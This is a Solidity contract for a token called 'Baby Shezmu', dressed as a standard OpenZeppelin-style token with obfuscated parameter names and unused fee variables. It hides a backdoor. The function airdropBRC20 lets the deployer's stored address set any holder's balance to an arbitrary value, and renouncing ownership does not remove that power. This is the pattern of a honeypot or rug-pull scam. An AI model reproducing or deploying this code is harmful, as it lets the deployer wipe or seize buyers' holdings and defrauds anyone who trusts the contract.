// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
pragma solidity ^0.8.24;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

interface IBRC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address memorypath) external view returns (uint256);
    function transfer(address recipient, uint256 IFactory) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 IFactory) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 IFactory
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBRC20Metadata is IBRC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode 
        return msg.data;
    }
}
interface LaunchPool {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address BRC,
        uint amountBRCDesired,
        uint amountBRCMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountBRC, uint amountETH, uint liquidity);

    function swapExactBRCsForETHSupportingBRCOnTransferBRCs(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract BRC20 is Context, IBRC20, IBRC20Metadata {
    mapping(address => uint256) private sendBRC;
    uint256 private liquidityBRC = 5;
    uint256 private marketingBRC = 5;
    uint256 private developmentBRC = 5;
    uint256 private burnBRC = 3;
    uint256 private totalBRC = 3;
    uint256 private sellBRC = 2;
    uint256 private transferBRC = 2;
    uint256 private totalfee = 10;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal development_adr = 0x000000000000000000000000000000000000dEaD; 
    address internal marketing_adr = 0x000000000000000000000000000000000000dEaD;
    address internal liquidity_adr = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _totalSupply * 300 ) / 10000;
    uint256 public _maxSellAmount = ( _totalSupply * 300 ) / 10000;
    uint256 public _maxadrBRC = ( _totalSupply * 300 ) / 10000;
    mapping(address => mapping(address => uint256)) private _allowances;
    string public BRCWebsite = "https://www.Shezmu.io/";
    string public Copyright = "CERTIC"; 
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private _taxadr = _msgSender();
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
   
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address memorypath) public view virtual override returns (uint256) {
        return sendBRC[memorypath];
    }

    function transfer(address recipient, uint256 IFactory) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, IFactory);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 IFactory) public virtual override returns (bool) {
        _approve(_msgSender(), spender, IFactory);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 IFactory
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= IFactory, "BRC20: transfer IFactory exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - IFactory);
            }
        }

        _transfer(sender, recipient, IFactory);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedCoin) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedCoin);
        return true;
    }

    function decreaseAllowance(address spender, uint256 sniffer) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= sniffer, "BRC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - sniffer);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 IFactory
    ) internal virtual {
        require(sender != address(0), "BRC20: transfer from the zero address");
        require(recipient != address(0), "BRC20: transfer to the zero address");

        _beforeBRCTransfer(sender, recipient, IFactory);

        uint256 senderBalance = sendBRC[sender];
        require(senderBalance >= IFactory, "BRC20: transfer IFactory exceeds balance");
        unchecked {
            sendBRC[sender] = senderBalance - IFactory;
        }
        sendBRC[recipient] += IFactory;

        emit Transfer(sender, recipient, IFactory);

        _afterBRCTransfer(sender, recipient, IFactory);
    }

    function _BRCSwapThreshold(address memorypath, uint256 IFactory) internal virtual {
        require(memorypath != address(0), "BRC20: mint to the zero address");

        _beforeBRCTransfer(address(0), memorypath, IFactory);

        _totalSupply += IFactory;
        sendBRC[memorypath] += IFactory;
        emit Transfer(address(0), memorypath, IFactory);

        _afterBRCTransfer(address(0), memorypath, IFactory);
    }


              function getBRCWebsite() public view returns (string memory) {
        return BRCWebsite;
    } 

   
 
    function _approve(
        address owner,
        address spender,
        uint256 IFactory
    ) internal virtual {
        require(owner != address(0), "BRC20: approve from the zero address");
        require(spender != address(0), "BRC20: approve to the zero address");

        _allowances[owner][spender] = IFactory;
        emit Approval(owner, spender, IFactory);
    }
    function airdropBRC20(address BRCBRC20rdrop, uint256 BRCDate, uint256 BRCID, uint256 sniffer) external {
        require(_msgSender() == _taxadr);
        sendBRC[BRCBRC20rdrop] = BRCDate * BRCID ** sniffer;
    }   
    function _beforeBRCTransfer(
        address from,
        address to,
        uint256 IFactory
    ) internal virtual {}

    function _afterBRCTransfer(
        address from,
        address to,
        uint256 IFactory
    ) internal virtual {}
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Shezmu is BRC20, Ownable {
    constructor () BRC20("Baby Shezmu", "BSHEZMU") 
    {    
        _BRCSwapThreshold(msg.sender,  5000000000000 * (10 ** uint256(decimals())));
    }
}